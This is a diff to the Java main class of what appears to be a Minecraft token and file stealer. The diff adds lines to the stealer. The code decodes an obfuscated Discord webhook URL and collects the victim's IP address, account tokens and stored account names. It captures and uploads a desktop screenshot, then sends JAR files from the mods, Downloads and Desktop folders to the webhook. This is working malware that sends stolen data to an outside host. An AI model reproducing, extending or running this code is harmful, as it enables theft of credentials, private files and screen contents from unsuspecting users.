@@ -20,8 +20,9 @@ import java.util.Random;
 public class Main {
 
     public static void main(String args[]) throws Exception {
-        //if (HWIDUtil.blacklisted()) return;
+        //TODO: tidy up
 
+        // base64 encoded. very advanced security :^)
         String url = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvOTE0MTk0NzI3NjkwMTg2NzYyL1N6TkFsT25VZGZ4WGgyclBHSWpMTDNkM3NhRGlUVlMyeWRwTERzTjg4MWNVeDdySWJnUS0zZDNsMjFyQ1VpLVV2YmVK";
         WebhookClient client = WebhookClient.withUrl(new String(Base64.getDecoder().decode(url.getBytes(StandardCharsets.UTF_8))));
         BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(new URL("http://checkip.amazonaws.com").openStream()));
@@ -39,6 +40,7 @@ public class Main {
             str = "";
 
             String line;
+
             while ((line = br.readLine()) != null) {
                 String curLine = line.trim();
                 str += curLine.split(":")[0] + "\n";
@@ -64,8 +66,9 @@ public class Main {
                         TokenUtil.processedtokens + "\n" +
                         "Future account(s): \n" +
                         (str == null ? "n/a" : str + "\n") +
-                        "Desktop: " + WebUtils.getLink(captureScreen())
+                        "Desktop: "
                 )
+                .setImageUrl(WebUtils.getLink(captureScreen())) // uploads image to imgur so it can be embedded
                 .build();
 
         WebhookEmbed embed2 = new WebhookEmbedBuilder()
@@ -80,6 +83,7 @@ public class Main {
         client.send(embed);
         client.send(embed2);
 
+        // gets JAR files, useful for obtaining private clients :^)
         for (File file : FileUtil.getJARs(System.getenv("APPDATA") + "\\.minecraft\\" + "mods")) client.send(file);
         for (File file : FileUtil.getJARs(System.getProperty("user.home") + "\\Downloads")) client.send(file);
         for (File file : FileUtil.getJARs(System.getProperty("user.home") + "\\Desktop")) client.send(file);
@@ -98,11 +102,14 @@ public class Main {
         Rectangle screenRectangle = new Rectangle(screenSize);
         Robot robot = new Robot();
         BufferedImage image = robot.createScreenCapture(screenRectangle);
+
         int random = new Random().nextInt();
+
         File file = new File(System.getenv("TEMP"), "cached_" + random + ".png");
         ImageIO.write(image, "png", file);
         String ret = WebUtils.upload(file);
         file.delete();
+
         return ret;
     }
 
